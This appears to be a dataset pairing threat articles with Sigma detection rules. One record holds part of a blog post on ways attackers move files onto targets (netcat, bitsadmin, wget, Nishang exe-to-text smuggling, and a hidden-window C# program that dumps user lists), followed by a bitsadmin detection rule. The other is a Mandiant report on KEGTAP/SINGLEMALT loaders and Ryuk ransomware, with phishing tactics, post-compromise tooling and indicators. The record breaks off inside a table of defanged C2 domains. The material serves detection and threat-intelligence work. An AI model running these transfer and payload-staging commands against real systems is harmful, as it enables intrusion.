shell:\n\n```\nroot@kali:~# ruby test.rb\n```\n\n### 6. PHP File Download\n\nPHP is usually a server-side scripting language used for web development, but can also be used as a general purpose scripting language.\n\n```\n#!/usr/bin/php\n<?php\n$data = @file(\"https://example.com/file\");\n$lf = \"local_file\";\n$fh = fopen($lf, 'w');\nfwrite($fh, $data[0]);\nfclose($fh);\n?>\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# php test.php\n```\n\n### 7. FTP File Download\n\nFor this method, an attacker would want to echo the FTP commands to a bash script since it generally requires user interaction to input a username and password. This bash script can then be run to have all the steps ran without the need for interaction.\n\n```\nftp 127.0.0.1 username password get file exit\n```\n\n### 8. TFTP File Download\n\nTrivial FTP comes by default in Windows Vista and below. Note that you will have to set up the corresponding server to connect to. It can be run using the following command:\n\n```\ntftp -i host GET C:%homepath%file location_of_file_on_tftp_server\n```\n\n### 9. Bitsadmin File Download\n\nBitsadmin is a command-line tool for windows that allows a user to create download or upload tasks.\n\n```\nbitsadmin /transfer n https://domain/file c:%homepath%file\n```\n\n### 10. Wget File Download\n\nWget is a Linux and Windows tool that allows for non-interactive downloads.\n\n```\nwget https://example.com/file\n```\n\n### 11. Netcat File Download\n\nNetcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection. Note that this example is Linux specific.\n\nOn the attacker's computer, type:\n\n```\ncat file | nc -l 1234\n```\n\nThis will print the contents of the file to the local port 1234. Then, whenever someone connects to that port, the contents of the file will be sent to the connecting IP.\n\nThe following command should be run on the machine the attacker is targeting:\n\n```\nnc host_ip 1234 > file\n```\n\n### 12. Windows Share File Download\n\nWindows shares can be mounted to a drive letter, and files can then be copied over by subsequent copy commands.\n\nTo mount a remote drive, type:\n\n```\nnet use x: \\\\127.0.0.1\\share /user:example.com\\userID myPassword\n```\n\n### 13. Notepad Dialog Box File Download\n\nIf you have access (RDP, physical, etc.) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention (UNC) path. This also works well when you are breaking out of a locked-down application being run on a terminal.\n\n1. Open notepad\n2. Go to file – open\n3. In the File Name box near the bottom, type in the full URL path to your file\n\n```image\nAlt: Rg Download File\nDescription: The image displays a Notepad dialog box on a Windows operating system. It shows the 'Open' file dialog with the path field populated by a URL: 'http://en.wikipedia.org/robots.txt'. The dialog box is framed with red lines, highlighting the area where the URL is entered. The interface indicates that this method can be used to download a file when user permissions restrict access to a web browser.\nTranscription: |\n  Untitled - Notepad\n  \n  Open\n  Computer  Local Disk (C:)\n  \n  Organize  New folder\n  \n  Name\n  Date modified\n  Type\n  Size\n  \n  File name: http://en.wikipedia.org/robots.txt\n  \n  Text Documents (*.txt)\n  Encoding: ANSI\n  \n  [Open] [Cancel]\n```\n\nNotepad is kind enough to go out and grab the contents of this file for you.\n\n### 14. Exe to Txt, and Txt to Exe with PowerShell and Nishang\n\nThis is possibly one of my favorite tools to use when trying to move an exe to a machine. Nishang allows you to convert an exe to hex, then reassemble the hex into the original exe using PowerShell. I have seen group policies that do not allow for the transfer of exes through the RDP clipboard. Although it provides basic protection, it (sometimes) still allows the ability to copy text through the clipboard. In this scenario, you would be able to copy across the Nishang PowerShell source to a file on the box and rename the extension to .ps1. The Nishang script you want to copy is TexttoExe.ps1, and it is only 8 lines long. You can download Nishang here.\n\nTo convert the exe to a hex file, type:\n\n```\nPS > .\\ExetoText.ps1 evil.exe evil.txt\n```\n\nOpen the evil.txt file and copy the contents. Then paste the contents to the target machine using the RDP clipboard. Do the same with the contents of the TexttoExe.ps1 file in Nishang.\n\nTo convert the hex file back to an exe, type:\n\n```\nPS > .\\TexttoExe.ps1 evil.txt evil.exe\n```\n\nThis will result in your evil exe being successfully moved to the target machine.\n\n### 15. Csc.exe to Compile Source from a File\n\nC sharp compiler (csc) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.\n\nThe default location for this executable is the following:\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\version\n```\n\nUsing the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:\\Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.\n\n```\npublic class Evil {\n    public static void Main() {\n        System.Diagnostics.Process process = new System.Diagnostics.Process();\n        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n        startInfo.FileName = \"cmd.exe\";\n        startInfo.Arguments = \"/C net users > C:\\\\Temp\\\\users.txt\";\n        process.StartInfo = startInfo;\n        process.Start();\n    }\n}\n```\n\nTo compile your source code, type:\n\n```\ncsc.exe /out:C:\\evil.exe C:\\evil.cs\n```\n\n---\n\nHopefully this blog has given you viable options for getting your files (malicious or otherwise) over to a server.",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml",
    "id": "74"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           